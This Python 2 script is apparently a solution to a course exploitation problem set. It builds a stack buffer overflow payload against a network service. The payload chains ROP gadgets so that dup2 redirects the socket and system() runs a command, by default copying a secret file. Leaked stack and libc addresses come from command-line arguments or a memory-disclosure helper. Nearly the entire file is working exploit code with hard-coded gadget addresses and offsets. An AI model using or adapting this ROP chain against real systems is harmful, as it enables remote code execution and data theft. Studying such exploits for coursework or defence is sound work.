#! /usr/bin/env python2

import sys
from struct import pack

import argparse
import memory_disc
import json

# Args
parser = argparse.ArgumentParser()
parser.add_argument('-s','--only-system', action='store_true', help='Execute only system(), without dup2')
parser.add_argument('-stack', help='Set leaked address realative to stack')
parser.add_argument('-libc', help='Spet leaked address relative to libc')
parser.add_argument('-memory-port',type=int ,help='Set port number, it will Exploit memory vulnerability automatically')
parser.add_argument('-p', '--print-address',action="store_true", help="Print addresses, and create solution.json")
parser.add_argument('-c', '--command', help='Specific command to penetrate vulnerable server')
parser.add_argument('-secret', help='set secret file localtion, to obtain secret value for printing solution')
args = parser.parse_args()




#   ROPGADGET 
#   0x0000000000426bf3 : pop rdi ; ret
#   0x0000000000426bf1 : pop rsi ; pop r15 ; ret
#   0x0000000000412ed2 : pop rdx ; ret 0
#   0x000000000040bd1c : mov rax, rdi ; pop rbp ; ret



# Constants
buf_len = 0x418

# gadgets
poprdi_addr = 0x426bf3 # ONLY ONE NEEDED to do system()
poprsi_2_addr = 0x426bf1 # works for dup2
poprdx_addr = 0x412ed2 # not needed
xorrax_2_addr = 0x00000000004132c6 # not good
movraxrdi_null_addr = 0x000000000040bd1c # was trying to do setuid

# Parse hex string address, used for:  from command line + from memory_disc module
def parse_addresses(stack, libc):
	global buf_addr, libc_addr
	leaked_stack = int(stack,16)
        leaked_libc  = int(libc,16)
	        
	# Using addresses that share base values with stack and libc, to determine &buf_addr, and libc_addr
	# I got this based on offline analysis, I am using leaked addresses from output, The third QWORD=stack and the fifth=libc.
        buf_addr = leaked_stack + 0x30 
        libc_addr = leaked_libc-0xe0bbc8
	

# Memory Disclosure 
leaked_sockfd=0x4

if args.stack != None and args.libc != None:
	parse_addresses(args.stack, args.libc)

elif args.memory_port != None:
	memory_disc.exploit(args.memory_port)
	parse_addresses(memory_disc.stack, memory_disc.libc)
	
else:
	buf_addr = 0x7fffffffe4a0
	libc_addr = 0x7ffff6935000 
	


# Libc wrappers

dup2_addr = libc_addr+0xebfe0
exit_addr = libc_addr+0x3c290
setuid_addr =libc_addr+0xc1ed0
system_addr =  libc_addr+0x46640



# IF printing -p is set,,,
if (args.print_address):
                print ("&buf="+hex(buf_addr))
		print("&libc="+hex(libc_addr))
                print ("&system="+hex(system_addr))
		print ''

		secret = ''
		if args.secret != None: secret = memory_disc.run('cat {0}'.format(args.secret), shell = True)[1].split()[0]
		result = {'gadget_chain':[ hex(addr) for addr in [poprdi_addr,  buf_addr, system_addr]], 'secret':secret}
        	print json.dumps(result, sort_keys=False, indent=4)
                exit()


# Exploit -------------------------------------------------------------

def setuid():
	return pack('<QQQQQ', poprdi_addr,  0x0, movraxrdi_null_addr, 0x0, setuid_addr)

def dup2(sockfd, i):
	return pack('<QQQQQQ', poprdi_addr, sockfd, poprsi_2_addr,  i,   i, dup2_addr)

def csystem():
	return pack('<QQQ', poprdi_addr,  buf_addr, system_addr)

def cexit():
	return '' #pack('<Q',exit_addr) 


command = "cat /usr/local/share/prset04.secret > /home/spatialisotope/rop/secret\x00"
if(args.command != None):
	command = args.command + '\x00'
buf = '/bin/sh\x00'  + command  +  '\x90' * (buf_len-len(command))

if (args.only_system): 
	buf2 = csystem() 
else:
	buf2 = dup2(leaked_sockfd,0) + dup2(leaked_sockfd,1)   +   csystem() + cexit()

sys.stdout.write(buf)
sys.stdout.write(buf2)
